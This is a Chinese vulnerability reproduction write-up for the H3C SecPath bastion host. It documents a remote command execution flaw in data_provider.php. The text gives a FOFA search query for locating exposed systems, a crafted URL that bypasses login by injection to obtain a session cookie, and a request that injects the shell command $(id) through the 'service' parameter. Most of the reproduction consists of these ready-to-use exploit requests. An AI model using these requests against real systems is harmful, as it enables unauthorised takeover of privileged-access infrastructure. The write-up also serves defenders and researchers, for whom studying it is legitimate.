# H3C-SecParh堡垒机-data_provider.php-远程命令执行漏洞

## 漏洞描述

H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令

## 漏洞影响

> [!NOTE]
>
> H3C SecParh堡垒机

## 漏洞影响

> [!NOTE]
>
> H3C SecParh堡垒机 

## FOFA

> [!NOTE]
>
> app="H3C-SecPath-运维审计系统" && body="2018"

## 漏洞复现

登录页面如下

![image-20210616132951212](H3C-SecParh堡垒机-data_provider.php-远程命令执行漏洞.assets/1627363093268538.jpg)

先通过任意用户登录获取Cookie

```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

![image-20210616133356940](H3C-SecParh堡垒机-data_provider.php-远程命令执行漏洞.assets/1627363093463478.jpg)

```
/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
```

![image-20210616133643292](H3C-SecParh堡垒机-data_provider.php-远程命令执行漏洞.assets/162736309384631.jpg)